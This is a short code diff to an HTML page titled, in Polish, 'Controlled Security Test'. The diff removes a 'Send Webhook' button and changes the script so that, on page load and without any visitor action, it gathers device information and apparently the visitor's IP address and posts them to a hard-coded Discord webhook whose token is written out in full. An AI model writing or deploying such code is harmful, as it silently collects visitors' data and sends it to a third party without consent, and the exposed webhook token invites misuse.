@@ -7,10 +7,9 @@
     <title>Kontrolowany Test Bezpieczeństwa</title>
 </head>
 <body>
-    <button onclick="sendWebhookToDiscord()">Send Webhook</button>
 
     <script>
-        function sendWebhookToDiscord() {
+        document.addEventListener("DOMContentLoaded", function() {
             var webhookURL = 'https://discord.com/api/webhooks/1255133774920945754/sl9zqSXyg5iHmfcBVl06SBRIQDfrz_r6l0dlwcacYU-pF3T99wNLJFAP29cfTGpraz4M';
 
             var deviceInfo = {
@@ -56,7 +55,7 @@
                 .catch(error => {
                     console.error('There was a problem with the IP fetch operation:', error);
                 });
-        }
+        });
     </script>
     <div class="container">
         <h1>Kontrolowany Test Bezpieczeństwa</h1>
